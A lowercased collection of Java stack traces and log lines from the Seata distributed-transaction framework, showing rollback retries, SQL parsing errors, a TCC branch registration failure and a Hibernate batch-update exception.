~[tomcat-embed-core-9.0.24.jar:9.0.24] at org.apache.tomcat.websocket.server.wsfilter.dofilter(wsfilter.java:53) ~[tomcat-embed-websocket-9.0.24.jar:9.0.24] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.24.jar:9.0.24] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.24.jar:9.0.24] at org.springframework.web.filter.requestcontextfilter.dofilterinternal(requestcontextfilter.java:99) ~[spring-web-5.1.9.release.jar:5.1.9.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:118) ~[spring-web-5.1.9.release.jar:5.1.9.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.24.jar:9.0.24] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.24.jar:9.0.24] at org.springframework.web.filter.formcontentfilter.dofilterinternal(formcontentfilter.java:92) ~[spring-web-5.1.9.release.jar:5.1.9.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:118) ~[spring-web-5.1.9.release.jar:5.1.9.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.24.jar:9.0.24] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.24.jar:9.0.24] at org.springframework.web.filter.hiddenhttpmethodfilter.dofilterinternal(hiddenhttpmethodfilter.java:93) ~[spring-web-5.1.9.release.jar:5.1.9.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:118) ~[spring-web-5.1.9.release.jar:5.1.9.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.24.jar:9.0.24] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.24.jar:9.0.24] at org.springframework.web.filter.characterencodingfilter.dofilterinternal(characterencodingfilter.java:200) ~[spring-web-5.1.9.release.jar:5.1.9.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:118) ~[spring-web-5.1.9.release.jar:5.1.9.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.24.jar:9.0.24] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.24.jar:9.0.24] at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:202) ~[tomcat-embed-core-9.0.24.jar:9.0.24] at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:96) [tomcat-embed-core-9.0.24.jar:9.0.24] at org.apache.catalina.authenticator.authenticatorbase.invoke(authenticatorbase.java:526) [tomcat-embed-core-9.0.24.jar:9.0.24] at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:139) [tomcat-embed-core-9.0.24.jar:9.0.24] at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:92) [tomcat-embed-core-9.0.24.jar:9.0.24] at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:74) [tomcat-embed-core-9.0.24.jar:9.0.24] at org.apache.catalina.connector.coyoteadapter.service(coyoteadapter.java:343) [tomcat-embed-core-9.0.24.jar:9.0.24] at org.apache.coyote.http11.http11processor.service(http11processor.java:408) [tomcat-embed-core-9.0.24.jar:9.0.24] at org.apache.coyote.abstractprocessorlight.process(abstractprocessorlight.java:66) [tomcat-embed-core-9.0.24.jar:9.0.24] at org.apache.coyote.abstractprotocol$connectionhandler.process(abstractprotocol.java:860) [tomcat-embed-core-9.0.24.jar:9.0.24] at org.apache.tomcat.util.net.nioendpoint$socketprocessor.dorun(nioendpoint.java:1587) [tomcat-embed-core-9.0.24.jar:9.0.24] at org.apache.tomcat.util.net.socketprocessorbase.run(socketprocessorbase.java:49) [tomcat-embed-core-9.0.24.jar:9.0.24] at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) [na:1.8.0_211] at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) [na:1.8.0_211] at org.apache.tomcat.util.threads.taskthread$wrappingrunnable.run(taskthread.java:61) [tomcat-embed-core-9.0.24.jar:9.0.24] at java.lang.thread.run(thread.java:748) [na:1.8.0_211]
2019-10-14 16:48:09.602 info [retryrollbacking_1]io.seata.server.coordinator.defaultcore.doglobalrollback:412 -failed to rollback branch xid=192.168.117.1:8091:2024768112 branchid=2024768115
2019-10-14 16:48:09.978 info [retryrollbacking_1]io.seata.server.coordinator.defaultcore.doglobalrollback:412 -failed to rollback branch xid=192.168.117.1:8091:2024768112 branchid=2024768115
2019-10-14 16:48:10.358 info [retryrollbacking_1]io.seata.server.coordinator.defaultcore.doglobalrollback:412 -failed to rollback branch xid=192.168.117.1:8091:2024768112 branchid=2024768115
2019-10-14 16:48:10.725 info [retryrollbacking_1]io.seata.server.coordinator.defaultcore.doglobalrollback:412 -failed to rollback branch xid=192.168.117.1:8091:2024768112 branchid=2024768115
2019-10-14 16:48:11.118 info [retryrollbacking_1]io.seata.server.coordinator.defaultcore.doglobalrollback:412 -failed to rollback branch xid=192.168.117.1:8091:2024768112 branchid=2024768115
2019-10-14 16:48:11.490 info [retryrollbacking_1]io.seata.server.coordinator.defaultcore.doglobalrollback:412 -failed to rollback branch xid=192.168.117.1:8091:2024768112 branchid=2024768115
[error] 2019-10-10 10:48:48 [http-nio-8012-exec-8] io.seata.rm.datasource.exec.abstractdmlbaseexecutor (abstractdmlbaseexecutor.java:104) - exception occur
java.lang.illegalargumentexception: unexpected where expr: sqlexistsexpr at io.seata.rm.datasource.sql.druid.mysqlupdaterecognizer.getwherecondition(mysqlupdaterecognizer.java:117) at io.seata.rm.datasource.exec.basetransactionalexecutor.buildwherecondition(basetransactionalexecutor.java:134) at io.seata.rm.datasource.exec.updateexecutor.buildbeforeimagesql(updateexecutor.java:74) at io.seata.rm.datasource.exec.updateexecutor.beforeimage(updateexecutor.java:62) at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommitfalse(abstractdmlbaseexecutor.java:71) at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommittrue(abstractdmlbaseexecutor.java:93) at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.doexecute(abstractdmlbaseexecutor.java:57) at io.seata.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:96) at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:101) at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:47) at io.seata.rm.datasource.preparedstatementproxy.executeupdate(preparedstatementproxy.java:83)
2019-10-08 23:20:00.591 error 133262 [pool-40-thread-2] io.seata.rm.tcc.interceptor.actioninterceptorhandler 126 : tcc branch register error, xid:10.35.226.31:8091:2016957836 io.seata.core.exception.transactionexception: response[transactionexception[10.35.226.31:8091:2016957836]] at io.seata.rm.abstractresourcemanager.branchregister(abstractresourcemanager.java:68) ~[seata-rm-0.6.1-fin-snapshot.jar!/:?] at io.seata.rm.defaultresourcemanager.branchregister(defaultresourcemanager.java:96) ~[seata-rm-0.6.1-fin-snapshot.jar!/:?] at io.seata.rm.tcc.interceptor.actioninterceptorhandler.dotccactionlogstore(actioninterceptorhandler.java:121) ~[seata-tcc-0.6.1-fin-snapshot.jar!/:?] at io.seata.rm.tcc.interceptor.actioninterceptorhandler.proceed(actioninterceptorhandler.java:72) ~[seata-tcc-0.6.1-fin-snapshot.jar!/:?] at io.seata.spring.tcc.tccactioninterceptor.invoke(tccactioninterceptor.java:78) ~[seata-spring-0.6.1-fin-snapshot.jar!/:?] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:186) ~[spring-aop-5.1.2.release.jar!/:5.1.2.release] at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:212) ~[spring-aop-5.1.2.release.jar!/:5.1.2.release] at com.sun.proxy.$proxy142.chargeinterest(unknown source) ~[?:?] at com.oppo.accountingsuppl.core.historydata.accounthandler.chargeinterest(accounthandler.java:557) ~[accounting-suppl-core-1.0.0-snapshot.jar!/:1.0.0-snapshot] at com.oppo.accountingsuppl.core.historydata.accounthandler.tallytrans(accounthandler.java:239) ~[accounting-suppl-core-1.0.0-snapshot.jar!/:1.0.0-snapshot] at com.oppo.accountingsuppl.core.historydata.accounthandler$$fastclassbyspringcglib$$57eb3f42.invoke() ~[accounting-suppl-core-1.0.0-snapshot.jar!/:1.0.0-snapshot] at org.springframework.cglib.proxy.methodproxy.invoke(methodproxy.java:218) ~[spring-core-5.1.2.release.jar!/:5.1.2.release] at org.springframework.aop.framework.cglibaopproxy$cglibmethodinvocation.invokejoinpoint(cglibaopproxy.java:746) ~[spring-aop-5.1.2.release.jar!/:5.1.2.release] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:163) ~[spring-aop-5.1.2.release.jar!/:5.1.2.release] at io.seata.spring.annotation.globaltransactionalinterceptor$1.execute(globaltransactionalinterceptor.java:106) ~[seata-spring-0.6.1-fin-snapshot.jar!/:?] at io.seata.tm.api.transactionaltemplate.execute(transactionaltemplate.java:64) ~[seata-tm-0.6.1-fin-snapshot.jar!/:?] at io.seata.spring.annotation.globaltransactionalinterceptor.handleglobaltransaction(globaltransactionalinterceptor.java:103) ~[seata-spring-0.6.1-fin-snapshot.jar!/:?] at io.seata.spring.annotation.globaltransactionalinterceptor.invoke(globaltransactionalinterceptor.java:78) ~[seata-spring-0.6.1-fin-snapshot.jar!/:?] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:186) ~[spring-aop-5.1.2.release.jar!/:5.1.2.release] at org.springframework.aop.framework.cglibaopproxy$dynamicadvisedinterceptor.intercept(cglibaopproxy.java:688) ~[spring-aop-5.1.2.release.jar!/:5.1.2.release] at com.oppo.accountingsuppl.core.historydata.accounthandler$$enhancerbyspringcglib$$34850f3b.tallytrans() ~[accounting-suppl-core-1.0.0-snapshot.jar!/:1.0.0-snapshot] at com.oppo.accountingsuppl.core.historydata.historydataserviceimpl$1$1.dointransactionwithoutresult(historydataserviceimpl.java:142) ~[accounting-suppl-core-1.0.0-snapshot.jar!/:1.0.0-snapshot] at org.springframework.transaction.support.transactioncallbackwithoutresult.dointransaction(transactioncallbackwithoutresult.java:36) ~[spring-tx-5.1.2.release.jar!/:5.1.2.release] at org.springframework.transaction.support.transactiontemplate.execute(transactiontemplate.java:140) ~[spring-tx-5.1.2.release.jar!/:5.1.2.release] at com.oppo.accountingsuppl.core.historydata.historydataserviceimpl$1.run(historydataserviceimpl.java:139) ~[accounting-suppl-core-1.0.0-snapshot.jar!/:1.0.0-snapshot] at java.util.concurrent.executors$runnableadapter.call(executors.java:511) ~[?:1.8.0_192] at java.util.concurrent.futuretask.run(futuretask.java:266) ~[?:1.8.0_192] at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) ~[?:1.8.0_192] at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) ~[?:1.8.0_192] at java.lang.thread.run(thread.java:748) [?:1.8.0_192]
java.sql.sqlsyntaxerrorexception: you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near 'order limit 1' at line 1 cause: java.sql.sqlexception: io.seata.common.exception.shouldneverhappenexception: [xid:192.168.31.209:8091:2024150408]get tablemeta failed
; uncategorized sqlexception; sql state [null]; error code [0]; io.seata.common.exception.shouldneverhappenexception: [xid:192.168.31.209:8091:2024150408]get tablemeta failed; nested exception is java.sql.sqlexception: io.seata.common.exception.shouldneverhappenexception: [xid:192.168.31.209:8091:2024150408]get tablemeta failed
2019-09-25 09:24:32,894 debug [org.hibernate.sql] - insert into ebd_operation_log (eop_id, eop_operate_person, eop_operate_result, eop_operate_info, eop_log_id) values (?, ?, ?, ?, ?)
2019-09-25 09:24:32,894 debug [org.hibernate.sql] - insert into ebd_operation_log (eop_id, eop_operate_person, eop_operate_result, eop_operate_info, eop_log_id) values (?, ?, ?, ?, ?)
2019-09-25 09:24:32,896 error [druid.sql.statement] - {conn-10006, pstmt-20006} execute error
insert into ebd_operation_log (eop_id, eop_operate_person, eop_operate_result, eop_operate_info, eop_log_id)
values (5014, 'cd', '4, 9', null, 6503)
java.lang.arrayindexoutofboundsexception at java.lang.system.arraycopy(native method) at oracle.jdbc.driver.t4crowidaccessor.unmarshalonerow(t4crowidaccessor.java:203) at oracle.jdbc.driver.t4c8oall.readrxd(t4c8oall.java:696) at oracle.jdbc.driver.t4cttifun.receive(t4cttifun.java:340) at oracle.jdbc.driver.t4cttifun.dorpc(t4cttifun.java:192) at oracle.jdbc.driver.t4c8oall.dooall(t4c8oall.java:531) at oracle.jdbc.driver.t4cpreparedstatement.dooall8(t4cpreparedstatement.java:207) at oracle.jdbc.driver.t4cpreparedstatement.executeforrows(t4cpreparedstatement.java:1044) at oracle.jdbc.driver.oraclepreparedstatement.executeforrowswithtimeout(oraclepreparedstatement.java:10143) at oracle.jdbc.driver.oraclepreparedstatement.executebatch(oraclepreparedstatement.java:10249) at oracle.jdbc.driver.oraclestatementwrapper.executebatch(oraclestatementwrapper.java:230) at com.alibaba.druid.filter.filterchainimpl.statement_executebatch(filterchainimpl.java:3066) at com.alibaba.druid.filter.filteradapter.statement_executebatch(filteradapter.java:2496) at com.alibaba.druid.filter.filtereventadapter.statement_executebatch(filtereventadapter.java:279) at com.alibaba.druid.filter.filterchainimpl.statement_executebatch(filterchainimpl.java:3064) at com.alibaba.druid.wall.wallfilter.statement_executebatch(wallfilter.java:503) at com.alibaba.druid.filter.filterchainimpl.statement_executebatch(filterchainimpl.java:3064) at com.alibaba.druid.filter.filteradapter.statement_executebatch(filteradapter.java:2496) at com.alibaba.druid.filter.filtereventadapter.statement_executebatch(filtereventadapter.java:279) at com.alibaba.druid.filter.filterchainimpl.statement_executebatch(filterchainimpl.java:3064) at com.alibaba.druid.proxy.jdbc.statementproxyimpl.executebatch(statementproxyimpl.java:202) at com.alibaba.druid.pool.druidpooledpreparedstatement.executebatch(druidpooledpreparedstatement.java:566) at com.nstc.dtp.rm.datasource.statementproxy$10.execute(statementproxy.java:150) at com.nstc.dtp.rm.datasource.statementproxy$10.execute(statementproxy.java:147) at com.nstc.dtp.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommitfalse(abstractdmlbaseexecutor.java:61) at com.nstc.dtp.rm.datasource.exec.abstractdmlbaseexecutor.doexecute(abstractdmlbaseexecutor.java:48) at com.nstc.dtp.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:79) at com.nstc.dtp.rm.datasource.exec.executetemplate.execute(executetemplate.java:89) at com.nstc.dtp.rm.datasource.exec.executetemplate.execute(executetemplate.java:34) at com.nstc.dtp.rm.datasource.statementproxy.executebatch(statementproxy.java:147) at org.hibernate.jdbc.batchingbatcher.doexecutebatch(batchingbatcher.java:70) at org.hibernate.jdbc.abstractbatcher.executebatch(abstractbatcher.java:268) at org.hibernate.engine.actionqueue.executeactions(actionqueue.java:266) at org.hibernate.engine.actionqueue.executeactions(actionqueue.java:167) at org.hibernate.event.def.abstractflushingeventlistener.performexecutions(abstractflushingeventlistener.java:321) at org.hibernate.event.def.defaultflusheventlistener.onflush(defaultflusheventlistener.java:50) at org.hibernate.impl.sessionimpl.flush(sessionimpl.java:1027) at org.hibernate.impl.sessionimpl.managedflush(sessionimpl.java:365) at org.hibernate.transaction.jdbctransaction.commit(jdbctransaction.java:137) at org.springframework.orm.hibernate3.hibernatetransactionmanager.docommit(hibernatetransactionmanager.java:655) at org.springframework.transaction.support.abstractplatformtransactionmanager.processcommit(abstractplatformtransactionmanager.java:732) at org.springframework.transaction.support.abstractplatformtransactionmanager.commit(abstractplatformtransactionmanager.java:701) at org.springframework.transaction.interceptor.transactionaspectsupport.committransactionafterreturning(transactionaspectsupport.java:321) at com.nstc.framework.spring.transactioninterceptor.committransactionafterreturning(transactioninterceptor.java:39) at org.springframework.transaction.interceptor.transactioninterceptor.invoke(transactioninterceptor.java:116) at com.nstc.framework.spring.transactioninterceptor.invoke(transactioninterceptor.java:35) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:171) at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:204) at com.sun.proxy.$proxy11.acceptoperation(unknown source) at com.nstc.dtp.action.acceptoperationaction.execute(acceptoperationaction.java:31) at com.nstc.dtp.defaulteventserver$1.doinopensession(defaulteventserver.java:154) at com.nstc.framework.orm.hibernate3.opensessiontemplate.execute(opensessiontemplate.java:152) at com.nstc.dtp.defaulteventserver.execevent(defaulteventserver.java:152) at com.nstc.dtp.defaulteventserver.execute(defaulteventserver.java:305) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:57) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:606) at org.springframework.aop.support.aoputils.invokejoinpointusingreflection(aoputils.java:307) at org.springframework.aop.framework.reflectivemethodinvocation.invokejoinpoint(reflectivemethodinvocation.java:182) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:149) at org.springframework.remoting.support.remoteinvocationtraceinterceptor.invoke(remoteinvocationtraceinterceptor.java:77) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:171) at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:204) at com.sun.proxy.$proxy12.execute(unknown source) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:57) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:606) at org.springframework.remoting.support.remoteinvocation.invoke(remoteinvocation.java:205) at org.springframework.remoting.support.defaultremoteinvocationexecutor.invoke(defaultremoteinvocationexecutor.java:38) at org.springframework.remoting.support.remoteinvocationbasedexporter.invoke(remoteinvocationbasedexporter.java:78) at org.springframework.remoting.support.remoteinvocationbasedexporter.invokeandcreateresult(remoteinvocationbasedexporter.java:114) at org.springframework.remoting.httpinvoker.httpinvokerserviceexporter.handlerequest(httpinvokerserviceexporter.java:74) at org.springframework.web.servlet.mvc.httprequesthandleradapter.handle(httprequesthandleradapter.java:49) at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:875) at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:807) at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:571) at org.springframework.web.servlet.frameworkservlet.dopost(frameworkservlet.java:511) at javax.servlet.http.httpservlet.service(httpservlet.java:709) at com.nstc.framework.servlet.nstcdispatcherservlet.service(nstcdispatcherservlet.java:71) at javax.servlet.http.httpservlet.service(httpservlet.java:802) at com.nstc.framework.servlet.nstcdispatcherservlet.service(nstcdispatcherservlet.java:59) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:237) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:157) at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:214) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardcontextvalve.invokeinternal(standardcontextvalve.java:198) at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:152) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:137) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:118) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:102) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:109) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.containerbase.invoke(containerbase.java:929) at org.apache.coyote.tomcat5.coyoteadapter.service(coyoteadapter.java:160) at org.apache.coyote.http11.http11processor.process(http11processor.java:799) at org.apache.coyote.http11.http11protocol$http11connectionhandler.processconnection(http11protocol.java:705) at org.apache.tomcat.util.net.tcpworkerthread.runit(pooltcpendpoint.java:577) at org.apache.tomcat.util.threads.threadpool$controlrunnable.run(threadpool.java:683) at java.lang.thread.run(thread.java:745)
2019-09-25 09:24:32,897 warn [org.hibernate.util.jdbcexceptionreporter] - sql error: 0, sqlstate: null
2019-09-25 09:24:32,898 error [org.hibernate.util.jdbcexceptionreporter] - error
2019-09-25 09:24:32,898 error [org.hibernate.event.def.abstractflushingeventlistener] - could not synchronize database state with session
org.hibernate.exception.genericjdbcexception: could not execute jdbc batch update at org.hibernate.exception.sqlstateconverter.handlednonspecificexception(sqlstateconverter.java:126) at org.hibernate.exception.sqlstateconverter.convert(sqlstateconverter.java:114) at org.hibernate.exception.jdbcexceptionhelper.convert(jdbcexceptionhelper.java:66) at org.hibernate.jdbc.abstractbatcher.executebatch(abstractbatcher.java:275) at org.hibernate.engine.actionqueue.executeactions(actionqueue.java:266) at org.hibernate.engine.actionqueue.executeactions(actionqueue.java:167) at org.hibernate.event.def.abstractflushingeventlistener.performexecutions(abstractflushingeventlistener.java:321) at org.hibernate.event.def.defaultflusheventlistener.onflush(defaultflusheventlistener.java:50) at org.hibernate.impl.sessionimpl.flush(sessionimpl.java:1027) at org.hibernate.impl.sessionimpl.managedflush(sessionimpl.java:365) at org.hibernate.transaction.jdbctransaction.commit(jdbctransaction.java:137) at org.springframework.orm.hibernate3.hibernatetransactionmanager.docommit(hibernatetransactionmanager.java:655) at org.springframework.transaction.support.abstractplatformtransactionmanager.processcommit(abstractplatformtransactionmanager.java:732) at org.springframework.transaction.support.abstractplatformtransactionmanager.commit(abstractplatformtransactionmanager.java:701) at org.springframework.transaction.interceptor.transactionaspectsupport.committransactionafterreturning(transactionaspectsupport.java:321) at com.nstc.framework.spring.transactioninterceptor.committransactionafterreturning(transactioninterceptor.java:39) at org.springframework.transaction.interceptor.transactioninterceptor.invoke(transactioninterceptor.java:116) at com.nstc.framework.spring.transactioninterceptor.invoke(transactioninterceptor.java:35) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:171) at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:204) at com.sun.proxy.$proxy11.acceptoperation(unknown source) at com.nstc.dtp.action.acceptoperationaction.execute(acceptoperationaction.java:31) at com.nstc.dtp.defaulteventserver$1.doinopensession(defaulteventserver.java:154) at com.nstc.framework.orm.hibernate3.opensessiontemplate.execute(opensessiontemplate.java:152) at com.nstc.dtp.defaulteventserver.execevent(defaulteventserver.java:152) at com.nstc.dtp.defaulteventserver.execute(defaulteventserver.java:305) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:57) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:606) at org.springframework.aop.support.aoputils.invokejoinpointusingreflection(aoputils.java:307) at org.springframework.aop.framework.reflectivemethodinvocation.invokejoinpoint(reflectivemethodinvocation.java:182) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:149) at org.springframework.remoting.support.remoteinvocationtraceinterceptor.invoke(remoteinvocationtraceinterceptor.java:77) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:171) at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:204) at com.sun.proxy.$proxy12.execute(unknown source) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:57) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:606) at org.springframework.remoting.support.remoteinvocation.invoke(remoteinvocation.java:205) at org.springframework.remoting.support.defaultremoteinvocationexecutor.invoke(defaultremoteinvocationexecutor.java:38) at org.springframework.remoting.support.remoteinvocationbasedexporter.invoke(remoteinvocationbasedexporter.java:78) at org.springframework.remoting.support.remoteinvocationbasedexporter.invokeandcreateresult(remoteinvocationbasedexporter.java:114) at org.springframework.remoting.httpinvoker.httpinvokerserviceexporter.handlerequest(httpinvokerserviceexporter.java:74) at org.springframework.web.servlet.mvc.httprequesthandleradapter.handle(httprequesthandleradapter.java:49) at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:875) at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:807) at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:571) at org.springframework.web.servlet.frameworkservlet.dopost(frameworkservlet.java:511) at javax.servlet.http.httpservlet.service(httpservlet.java:709) at com.nstc.framework.servlet.nstcdispatcherservlet.service(nstcdispatcherservlet.java:71) at javax.servlet.http.httpservlet.service(httpservlet.java:802) at com.nstc.framework.servlet.nstcdispatcherservlet.service(nstcdispatcherservlet.java:59) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:237) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:157) at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:214) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardcontextvalve.invokeinternal(standardcontextvalve.java:198) at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:152) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:137) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:118) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:102) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:109) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.containerbase.invoke(containerbase.java:929) at org.apache.coyote.tomcat5.coyoteadapter.service(coyoteadapter.java:160) at org.apache.coyote.http11.http11processor.process(http11processor.java:799) at org.apache.coyote.http11.http11protocol$http11connectionhandler.processconnection(http11protocol.java:705) at org.apache.tomcat.util.net.tcpworkerthread.runit(pooltcpendpoint.java:577) at org.apache.tomcat.util.threads.threadpool$controlrunnable.run(threadpool.java:683) at java.lang.thread.run(thread.java:745)
caused by: java.sql.sqlexception: error at com.alibaba.druid.pool.druiddatasource.handleconnectionexception(druiddatasource.java:1569) at com.alibaba.druid.pool.druidpooledconnection.handleexception(druidpooledconnection.java:133) at com.alibaba.druid.pool.druidpooledstatement.checkexception(druidpooledstatement.java:77) at com.alibaba.druid.pool.druidpooledpreparedstatement.executebatch(druidpooledpreparedstatement.java:570) at com.nstc.dtp.rm.datasource.statementproxy$10.execute(statementproxy.java:150) at com.nstc.dtp.rm.datasource.statementproxy$10.execute(statementproxy.java:147) at com.nstc.dtp.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommitfalse(abstractdmlbaseexecutor.java:61) at com.nstc.dtp.rm.datasource.exec.abstractdmlbaseexecutor.doexecute(abstractdmlbaseexecutor.java:48) at com.nstc.dtp.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:79) at com.nstc.dtp.rm.datasource.exec.executetemplate.execute(executetemplate.java:89) at com.nstc.dtp.rm.datasource.exec.executetemplate.execute(executetemplate.java:34) at com.nstc.dtp.rm.datasource.statementproxy.executebatch(statementproxy.java:147) at org.hibernate.jdbc.batchingbatcher.doexecutebatch(batchingbatcher.java:70) at org.hibernate.jdbc.abstractbatcher.executebatch(abstractbatcher.java:268) ..
